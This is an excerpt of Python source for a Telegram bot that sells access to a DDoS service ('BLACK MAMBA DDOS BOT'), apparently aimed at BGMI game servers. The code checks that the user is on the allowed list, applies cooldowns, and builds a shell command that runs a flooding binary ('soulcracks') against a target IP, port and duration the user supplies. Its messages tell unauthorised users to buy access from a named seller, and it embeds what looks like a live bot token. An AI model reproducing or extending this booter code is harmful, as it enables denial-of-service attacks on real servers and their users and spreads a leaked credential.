...
bot = telebot.TeleBot('7198326048:AAHxu-rmvwfEvCOIEYpnUTdqxx8xUXERIhM')
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝙔𝙤𝙪𝙧 𝙖𝙧𝙚 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙬𝙖𝙞𝙩 0 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙤 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./soulcracks {target} {port} {time} 30 "
        ...
        response = ("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫 PLEASE BY FROM @MAZHAR46 ")
...
def welcome_start(message):
    ...
    response = f'''❇️ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 BLACK MAMBA 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 PLEASE BY FROM @MAZHAR46 👋'''
    bot.reply_to(message, response)
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙃𝙀𝙍𝙀 𝙄𝙎 𝙏𝙃𝙀 BLACK MAMBA  𝙑𝙄𝙋 𝙋𝙇𝘼𝙉𝙎:
